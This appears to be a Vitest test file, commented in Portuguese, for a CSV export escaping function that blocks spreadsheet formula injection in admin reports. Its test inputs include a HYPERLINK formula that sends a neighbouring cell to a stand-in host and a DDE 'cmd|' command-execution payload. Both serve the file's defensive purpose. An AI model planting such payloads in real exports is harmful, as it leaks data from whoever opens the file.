import { describe, it, expect } from "vitest";
import { escaparCelulaCSV } from "./export-csv";

// INJECAO DE FORMULA NO CSV EXPORTADO.
//
// Aspas resolvem virgula e quebra de linha; nao resolvem FORMULA — o Excel tira
// as aspas e depois avalia a celula, entao `"=1+1"` vira formula do mesmo jeito.
//
// O caminho e real: `nome` e gravavel pelo proprio cliente (`Conta.tsx`) e
// `empresa` vem do cadastro dele; os dois saem nos relatorios que o admin
// exporta e abre (`CustomerActivity`, `CustomersPerformance`).
//
// O risco pratico nao e executar programa — DDE (`=cmd|...`) esta desligado por
// padrao no Excel moderno — e sim EXFILTRACAO: `=HYPERLINK("http://x?d="&A2)` no
// Excel, `=IMPORTXML`/`=IMAGE` no Google Sheets, que carregam sozinhos e levam a
// celula vizinha junto.

const c = (v: unknown) => escaparCelulaCSV(v);

describe("escaparCelulaCSV: prefixo anti-formula", () => {
  it("neutraliza os quatro iniciadores de formula", () => {
    expect(c('=HYPERLINK("http://x?d="&A2,"abrir")'))
      .toBe(`"'=HYPERLINK(""http://x?d=""&A2,""abrir"")"`);
    expect(c("+1+1")).toBe(`"'+1+1"`);
    expect(c("-1+1")).toBe(`"'-1+1"`);
    expect(c("@SUM(A1)")).toBe(`"'@SUM(A1)"`);
  });

  it("tab e CR no inicio tambem sao vetor", () => {
    expect(c("\tSUM(A1)")).toBe(`"'\tSUM(A1)"`);
    expect(c("\r=1+1")).toBe(`"'\r=1+1"`);
  });

  it("texto normal NAO ganha aspa — senao todo relatorio fica sujo", () => {
    for (const ok of ["Nextgen Flooring", "Rua X, 100", 'Tile 12" x 12"', "3-M", "a=b", ""]) {
      expect(String(c(ok)), `estragou texto legitimo: ${ok}`).not.toMatch(/^"'/);
    }
  });

  it("NUMERO passa direto: sem aspas e sem prefixo", () => {
    // Se virasse texto, toda coluna de total pararia de somar na planilha. E
    // numero nao vem de entrada de usuario — nao e vetor.
    expect(c(-10)).toBe(-10);
    expect(c(1234.56)).toBe(1234.56);
    expect(c(0)).toBe(0);
  });

  it("continua escapando aspas e preservando virgula e quebra", () => {
    expect(c('a"b')).toBe(`"a""b"`);
    expect(c("a,b")).toBe(`"a,b"`);
    expect(c("a\nb")).toBe(`"a\nb"`);
  });

  it("nulo e indefinido viram celula vazia, nao a string 'null'", () => {
    expect(c(null)).toBe('""');
    expect(c(undefined)).toBe('""');
  });

  // TELEFONE TAMBEM E PREFIXADO, e isso e o CERTO.
  //
  // Eu tinha aberto excecao para "numero ou telefone puro", para nao sujar o
  // ciclo export -> Excel -> import. Era um erro, e do tipo pior: o motivo de
  // `+`/`-` estarem na lista e que o Excel AVALIA a celula que comeca com eles —
  // por isso `+HYPERLINK(...)` e vetor. Sem o apostrofo, `+1-800-555-0100` nao
  // vira telefone na planilha: vira a conta `1-800-555-100` = -1454, e era esse
  // numero que voltava para o banco. Troquei apostrofo visivel por numero errado
  // silencioso.
  //
  // Quem desfaz a marca e a ENTRADA — ver `desmarcaFormula` em `csv.ts`, e o
  // teste de ida-e-volta em `csv.test.ts`.
  it("telefone com `+` e prefixado, como qualquer celula que o Excel avaliaria", () => {
    for (const tel of ["+1 786 555 0100", "+1-800-555-0100", "+55 (11) 98765-4321", "-10"]) {
      expect(String(c(tel)), `deixou o Excel avaliar: ${tel}`).toMatch(/^"'/);
    }
  });

  it("e formula com `+`/`-` segue neutralizada", () => {
    for (const mau of ["+1+1", "-1+A2", "+SUM(A1:A9)", "-2+3+cmd|' /C calc'!A0"]) {
      expect(String(c(mau)), `deixou passar formula: ${mau}`).toMatch(/^"'/);
    }
  });
});
